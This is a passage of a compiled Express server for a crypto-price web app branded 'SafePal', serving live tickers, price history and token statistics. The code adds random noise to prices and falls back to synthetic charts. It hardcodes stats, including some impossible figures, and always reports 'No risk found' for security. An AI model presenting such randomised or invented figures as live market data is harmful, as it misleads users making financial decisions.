    { symbol: "DOT", priceUsd: 0.754, change24h: 2.58, high24h: 0.757, low24h: 0.733, volume24hUsd: 46e7 },
    { symbol: "LINK", priceUsd: 9.6, change24h: 1.78, high24h: 9.732, low24h: 9.383, volume24hUsd: 72e7 },
    { symbol: "SHIB", priceUsd: 447e-8, change24h: 1.59, high24h: 448e-8, low24h: 437e-8, volume24hUsd: 135e7 },
    { symbol: "TON", priceUsd: 1.6, change24h: 0.95, high24h: 1.641, low24h: 1.58, volume24hUsd: 62e7 },
    { symbol: "LTC", priceUsd: 44.4, change24h: 0.2, high24h: 44.75, low24h: 44.18, volume24hUsd: 82e7 },
    { symbol: "SUI", priceUsd: 0.6552, change24h: 1.16, high24h: 0.6602, low24h: 0.639, volume24hUsd: 125e7 },
    { symbol: "PEPE", priceUsd: 26e-7, change24h: 1.17, high24h: 262e-8, low24h: 253e-8, volume24hUsd: 195e7 },
    { symbol: "POL", priceUsd: 0.08246, change24h: 3.7, high24h: 0.08382, low24h: 0.0735, volume24hUsd: 43e7 },
    { symbol: "USDC", priceUsd: 1.00073, change24h: -0.01, high24h: 1.00094, low24h: 1.00057, volume24hUsd: 12e9 },
    { symbol: "INJ", priceUsd: 4.16, change24h: 2.87, high24h: 4.168, low24h: 4, volume24hUsd: 28e7 },
    { symbol: "TIA", priceUsd: 0.2979, change24h: 0.3, high24h: 0.3038, low24h: 0.2959, volume24hUsd: 31e7 },
    { symbol: "JUP", priceUsd: 0.167, change24h: 0.42, high24h: 0.1683, low24h: 0.1656, volume24hUsd: 45e7 },
    { symbol: "WIF", priceUsd: 0.1361, change24h: 0.44, high24h: 0.1376, low24h: 0.1354, volume24hUsd: 52e7 }
  ];
  cachedLivePrices = [...DEFAULT_CRYPTO_FEEDS];
  const updatePricesFromExternal = async () => {
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 2500);
      const binanceRes = await fetch("https://api.binance.com/api/v3/ticker/24hr", {
        signal: controller.signal
      });
      clearTimeout(timeoutId);
      if (binanceRes.ok) {
        const binanceData = await binanceRes.json();
        const symbolMap = {
          BTCUSDT: "BTC",
          ETHUSDT: "ETH",
          BNBUSDT: "BNB",
          SOLUSDT: "SOL",
          TRXUSDT: "TRX",
          NEARUSDT: "NEAR",
          XRPUSDT: "XRP",
          DOGEUSDT: "DOGE",
          ADAUSDT: "ADA",
          AVAXUSDT: "AVAX",
          DOTUSDT: "DOT",
          LINKUSDT: "LINK",
          SHIBUSDT: "SHIB",
          TONUSDT: "TON",
          LTCUSDT: "LTC",
          SUIUSDT: "SUI",
          PEPEUSDT: "PEPE",
          POLUSDT: "POL",
          MATICUSDT: "MATIC",
          USDCUSDT: "USDC",
          APTUSDT: "APT",
          ARBUSDT: "ARB",
          OPUSDT: "OP",
          UNIUSDT: "UNI",
          INJUSDT: "INJ",
          TIAUSDT: "TIA",
          FETUSDT: "FET",
          FILUSDT: "FIL",
          HBARUSDT: "HBAR",
          ICPUSDT: "ICP",
          SEIUSDT: "SEI",
          JUPUSDT: "JUP",
          WLDUSDT: "WLD",
          RUNEUSDT: "RUNE",
          ETCUSDT: "ETC",
          ALGOUSDT: "ALGO",
          VETUSDT: "VET",
          TAOUSDT: "TAO",
          KASUSDT: "KAS",
          WIFUSDT: "WIF",
          BONKUSDT: "BONK",
          FLOKIUSDT: "FLOKI"
        };
        const fdusdItem = Array.isArray(binanceData) ? binanceData.find((t) => t.symbol === "FDUSDUSDT" || t.symbol === "USDCUSDT") : null;
        const usdtMicroPrice = fdusdItem ? 1 / Math.max(parseFloat(fdusdItem.lastPrice), 1e-4) : 0.9992;
        const usdtMicroChange = fdusdItem ? -parseFloat(fdusdItem.priceChangePercent) : 0.01;
        const updated = [];
        updated.push({
          symbol: "USDT",
          priceUsd: Number(usdtMicroPrice.toFixed(4)),
          change24h: Number(usdtMicroChange.toFixed(4)),
          change24hUsd: Number((usdtMicroPrice - 0.999).toFixed(6)),
          high24h: 1.0005,
          low24h: 0.9988,
          volume24hUsd: 5323e7
        });
        const trxItem = Array.isArray(binanceData) ? binanceData.find((t) => t.symbol === "TRXUSDT") : null;
        const trxPrice = trxItem ? parseFloat(trxItem.lastPrice) : 0.3329;
        const trxChange = trxItem ? parseFloat(trxItem.priceChangePercent) : 0.33;
        updated.push({
          symbol: "GAS_TRX",
          priceUsd: trxPrice,
          change24h: trxChange,
          high24h: trxItem ? parseFloat(trxItem.highPrice) : trxPrice * 1.02,
          low24h: trxItem ? parseFloat(trxItem.lowPrice) : trxPrice * 0.98,
          volume24hUsd: 92e7
        });
        if (Array.isArray(binanceData)) {
          for (const item of binanceData) {
            const sym = symbolMap[item.symbol];
            if (sym) {
              updated.push({
                symbol: sym,
                priceUsd: parseFloat(item.lastPrice),
                change24h: parseFloat(item.priceChangePercent),
                high24h: parseFloat(item.highPrice),
                low24h: parseFloat(item.lowPrice),
                volume24hUsd: parseFloat(item.quoteVolume)
              });
            }
          }
        }
        if (updated.length >= 5) {
          cachedLivePrices = updated;
          lastPriceFetchTime = Date.now();
        }
      }
    } catch (e) {
      cachedLivePrices = cachedLivePrices.map((item) => {
        if (item.symbol === "USDT" || item.symbol === "USDC") return item;
        const tick = (Math.random() - 0.49) * 15e-4;
        const newPrice = Number((item.priceUsd * (1 + tick)).toFixed(item.priceUsd < 1 ? 6 : 2));
        return {
          ...item,
          priceUsd: newPrice,
          change24h: Number((item.change24h + tick * 2).toFixed(2))
        };
      });
      lastPriceFetchTime = Date.now();
    }
  };
  updatePricesFromExternal();
  setInterval(updatePricesFromExternal, 2500);
  setInterval(() => {
    cachedLivePrices = cachedLivePrices.map((item) => {
      if (item.symbol === "USDT" || item.symbol === "USDC") return item;
      const microVariance = (Math.random() - 0.495) * 8e-4;
      const newPrice = Number((item.priceUsd * (1 + microVariance)).toFixed(item.priceUsd < 1 ? 6 : 2));
      return {
        ...item,
        priceUsd: newPrice
      };
    });
  }, 1e3);
  app.get("/api/crypto/live", (_req, res) => {
    return res.json({ success: true, data: cachedLivePrices, timestamp: Date.now() });
  });
  app.get("/api/crypto/history", async (req, res) => {
    const symbol = (req.query.symbol || "USDT").toUpperCase();
    const timeframe = (req.query.timeframe || "1D").toUpperCase();
    const cacheKey = `${symbol}_${timeframe}`;
    const cached = historyCache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < 4e3) {
      return res.json({
        success: true,
        symbol,
        timeframe,
        data: cached.data,
        cached: true
      });
    }
    let interval = "1h";
    let limit = 24;
    let timeLabelFormat = "hour";
    if (timeframe === "1H") {
      interval = "5m";
      limit = 12;
      timeLabelFormat = "time";
    } else if (timeframe === "1D") {
      interval = "1h";
      limit = 24;
      timeLabelFormat = "hour";
    } else if (timeframe === "1W") {
      interval = "4h";
      limit = 28;
      timeLabelFormat = "day";
    } else if (timeframe === "1M") {
      interval = "1d";
      limit = 30;
      timeLabelFormat = "date";
    } else if (timeframe === "1Y") {
      interval = "1w";
      limit = 52;
      timeLabelFormat = "date";
    } else if (timeframe === "ALL") {
      interval = "1M";
      limit = 36;
      timeLabelFormat = "date";
    }
    const binancePair = symbol === "USDT" ? "FDUSDUSDT" : symbol === "USDC" ? "USDCUSDT" : symbol === "GAS_TRX" ? "TRXUSDT" : `${symbol}USDT`;
    try {
      const controller = new AbortController();
      const timeoutId = setTimeout(() => controller.abort(), 2e3);
      const binanceRes = await fetch(
        `https://api.binance.com/api/v3/klines?symbol=${binancePair}&interval=${interval}&limit=${limit}`,
        { signal: controller.signal }
      );
      clearTimeout(timeoutId);
      if (binanceRes.ok) {
        const rawKlines = await binanceRes.json();
        if (Array.isArray(rawKlines) && rawKlines.length > 0) {
          const isUsdtInverted = symbol === "USDT";
          const chartData = rawKlines.map((k) => {
            const openTime = new Date(k[0]);
            let timeStr = `${openTime.getHours()}:00`;
            if (timeLabelFormat === "time") {
              timeStr = `${openTime.getHours().toString().padStart(2, "0")}:${openTime.getMinutes().toString().padStart(2, "0")}`;
            } else if (timeLabelFormat === "day") {
              timeStr = openTime.toLocaleDateString(void 0, { weekday: "short" });
            } else if (timeLabelFormat === "date") {
              timeStr = `${openTime.getDate()} ${openTime.toLocaleDateString(void 0, { month: "short" })}`;
            }
            const rawPrice = parseFloat(k[4]);
            const finalPrice = isUsdtInverted ? Number((1 / Math.max(rawPrice, 1e-4)).toFixed(4)) : rawPrice;
            return {
              timestamp: k[0],
              time: timeStr,
              open: isUsdtInverted ? Number((1 / Math.max(parseFloat(k[1]), 1e-4)).toFixed(4)) : parseFloat(k[1]),
              high: isUsdtInverted ? Number((1 / Math.max(parseFloat(k[3]), 1e-4)).toFixed(4)) : parseFloat(k[2]),
              low: isUsdtInverted ? Number((1 / Math.max(parseFloat(k[2]), 1e-4)).toFixed(4)) : parseFloat(k[3]),
              close: finalPrice,
              price: finalPrice,
              volume: parseFloat(k[5])
            };
          });
          historyCache.set(cacheKey, { timestamp: Date.now(), data: chartData });
          return res.json({
            success: true,
            symbol,
            timeframe,
            data: chartData,
            source: "binance_live"
          });
        }
      }
    } catch (e) {
    }
    const matchedAsset = cachedLivePrices.find((a) => a.symbol === symbol);
    const basePrice = matchedAsset ? matchedAsset.priceUsd : symbol === "USDT" ? 1 : 100;
    const change24h = matchedAsset ? matchedAsset.change24h : 0.05;
    const isUp = change24h >= 0;
    const variance = symbol === "USDT" ? 3e-4 : timeframe === "1H" ? 3e-3 : timeframe === "1D" ? 0.018 : timeframe === "1W" ? 0.055 : timeframe === "1M" ? 0.12 : 0.35;
    const syntheticData = [];
    const now = Date.now();
    const stepMs = 24 * 60 * 60 * 1e3 / limit;
    for (let i = 0; i < limit; i++) {
      const ptTime = new Date(now - (limit - 1 - i) * stepMs);
      let timeStr = `${ptTime.getHours()}:00`;
      if (timeframe === "1H") {
        timeStr = `${ptTime.getHours().toString().padStart(2, "0")}:${ptTime.getMinutes().toString().padStart(2, "0")}`;
      } else if (timeframe === "1W") {
        timeStr = ptTime.toLocaleDateString(void 0, { weekday: "short" });
      } else if (timeframe === "1M" || timeframe === "1Y" || timeframe === "ALL") {
        timeStr = `${ptTime.getDate()} ${ptTime.toLocaleDateString(void 0, { month: "short" })}`;
      }
      const progress = i / (limit - 1 || 1);
      const trend = isUp ? (progress - 0.5) * variance : (0.5 - progress) * variance;
      const noise = (Math.sin(i * 1.7) * 0.5 + Math.cos(i * 0.9) * 0.3) * (variance * 0.25);
      const ptPrice = basePrice * (1 + trend + noise);
      syntheticData.push({
        timestamp: ptTime.getTime(),
        time: timeStr,
        price: Number(ptPrice.toFixed(basePrice < 1 ? 6 : 2))
      });
    }
    if (syntheticData.length > 0) {
      syntheticData[syntheticData.length - 1].price = basePrice;
    }
    historyCache.set(cacheKey, { timestamp: Date.now(), data: syntheticData });
    return res.json({
      success: true,
      symbol,
      timeframe,
      data: syntheticData,
      source: "synthetic_realtime"
    });
  });
  app.get("/api/crypto/stats", async (req, res) => {
    const symbol = (req.query.symbol || "USDT").toUpperCase();
    const liveAsset = cachedLivePrices.find((c) => c.symbol === symbol);
    const livePrice = liveAsset ? liveAsset.priceUsd : symbol === "USDT" ? 0.9992 : 100;
    const change24h = liveAsset ? liveAsset.change24h : 0.01;
    let marketCap = 0;
    let volume24h = liveAsset?.volume24hUsd || 0;
    let circulatingCount = 0;
    let circulatingStr = "";
    let holdersStr = "-";
    let created = "20 Sept 2024";
    let liquidityUsd = 0;
    let top10HoldersPct = "-";
    let top10AvgBuy = "-";
    let top10AvgSell = "-";
    let contract = "";
    let website = "";
    let whitepaper = "";
    let twitter = "";
    let reddit = "";
    if (symbol === "USDT") {
      marketCap = 912e8;
      volume24h = 5323e4;
      circulatingCount = 18309e7;
      circulatingStr = "183.09B (200.60%)";
      created = "20 Sept 2024";
      liquidityUsd = 37028e4;
      contract = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      website = "https://tether.to";
      whitepaper = "https://tether.to/en/legal";
      twitter = "https://twitter.com/tether_to";
      reddit = "https://reddit.com/r/Tether";
    } else if (symbol === "BTC") {
      marketCap = 1978e4 * livePrice;
      volume24h = 3845e7;
      circulatingCount = 1978e4;
      circulatingStr = "19.78M (94.19%)";
      created = "03 Jan 2009";
      liquidityUsd = 245e7;
      website = "https://bitcoin.org";
      whitepaper = "https://bitcoin.org/bitcoin.pdf";
      twitter = "https://twitter.com/bitcoin";
      reddit = "https://reddit.com/r/Bitcoin";
    } else if (symbol === "ETH") {
      marketCap = 1202e5 * livePrice;
      volume24h = 215e8;
      circulatingCount = 1202e5;
      circulatingStr = "120.20M (100%)";
      created = "30 Jul 2015";
      liquidityUsd = 182e7;
      website = "https://ethereum.org";
      whitepaper = "https://ethereum.org/en/whitepaper/";
      twitter = "https://twitter.com/ethereum";
      reddit = "https://reddit.com/r/ethereum";
    } else if (symbol === "SOL") {
      marketCap = 464e6 * livePrice;
      volume24h = 64e8;
      circulatingCount = 464e6;
      circulatingStr = "464.00M (79.2%)";
      created = "16 Mar 2020";
      liquidityUsd = 62e7;
      website = "https://solana.com";
      whitepaper = "https://solana.com/solana-whitepaper.pdf";
      twitter = "https://twitter.com/solana";
      reddit = "https://reddit.com/r/solana";
    } else if (symbol === "BNB") {
      marketCap = 1459e5 * livePrice;
      volume24h = 185e7;
      circulatingCount = 1459e5;
      circulatingStr = "145.90M (100%)";
      created = "14 Jul 2017";
      liquidityUsd = 48e7;
      website = "https://bnbchain.org";
      whitepaper = "https://github.com/bnb-chain/whitepaper";
      twitter = "https://twitter.com/BNBCHAIN";
      reddit = "https://reddit.com/r/binance";
    } else if (symbol === "TRX" || symbol === "GAS_TRX") {
      marketCap = 867e8 * livePrice;
      volume24h = 92e7;
      circulatingCount = 867e8;
      circulatingStr = "86.70B (100%)";
      created = "13 Sep 2017";
      liquidityUsd = 38015e4;
      contract = "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb";
      website = "https://tron.network";
      whitepaper = "https://tron.network/static/doc/white_paper_v_2_0.pdf";
      twitter = "https://twitter.com/trondao";
      reddit = "https://reddit.com/r/Tronix";
    } else {
      marketCap = 5e9 * livePrice;
      volume24h = 25e7;
      circulatingCount = 5e9;
      circulatingStr = "5.00B (100%)";
      created = "01 Jan 2021";
      liquidityUsd = 12e7;
      website = "https://coingecko.com";
      whitepaper = "https://coingecko.com";
      twitter = "https://twitter.com";
      reddit = "https://reddit.com";
    }
    return res.json({
      success: true,
      symbol,
      priceUsd: livePrice,
      change24h,
      marketCapUsd: marketCap,
      marketCapDisplay: `$${(marketCap / 1e9).toFixed(2)}B`,
      volume24hUsd: volume24h,
      volume24hDisplay: volume24h >= 1e9 ? `$${(volume24h / 1e9).toFixed(2)}B` : `$${(volume24h / 1e6).toFixed(2)}M`,
      holders: holdersStr,
      created,
      circulatingSupplyStr: circulatingStr,
      securityRisk: "No risk found",
      liquidityUsd,
      liquidityDisplay: `$${(liquidityUsd / 1e6).toFixed(2)}M`,
      top10HoldersPct,
      top10AvgBuy,
      top10AvgSell,
      contractAddress: contract,
      website,
      whitepaper,
      twitter,
      reddit
    });
  });
  const isProduction = process.env.NODE_ENV === "production" || Boolean(process.argv[1]) && (process.argv[1].endsWith(".cjs") || process.argv[1].includes("dist"));
  if (!isProduction) {
    const vite = await (0, import_vite.createServer)({
      server: {
        middlewareMode: true,
        allowedHosts: true
      },
      appType: "spa"
    });
    app.use(vite.middlewares);
  } else {
    const candidatePaths = [
      import_path.default.join(process.cwd(), "dist"),
      process.cwd(),
      import_path.default.join(process.cwd(), "..", "dist")
    ];
    const distPath = candidatePaths.find(
      (dir) => import_fs.default.existsSync(import_path.default.join(dir, "index.html"))
    ) || import_path.default.join(process.cwd(), "dist");
    console.log(`[PRODUCTION MODE] Serving static web files from: ${distPath}`);
    app.use(import_express.default.static(distPath));
    app.get("*", (_req, res) => {
      const indexFile = import_path.default.join(distPath, "index.html");
      if (import_fs.default.existsSync(indexFile)) {
        res.sendFile(indexFile);
      } else {
        res.status(404).send('Build files not found. Please run "npm run build" first.');
      }
    });
  }
  app.listen(PORT, HOST, () => {
    console.log(`SafePal Web Server running on http://${HOST}:${PORT}`);
  });
}
startServer().catch((err) => {
  console.error("[FATAL SERVER START ERROR]", err);
  process.exit(1);
});
//# sourceMappingURL=server.cjs.map
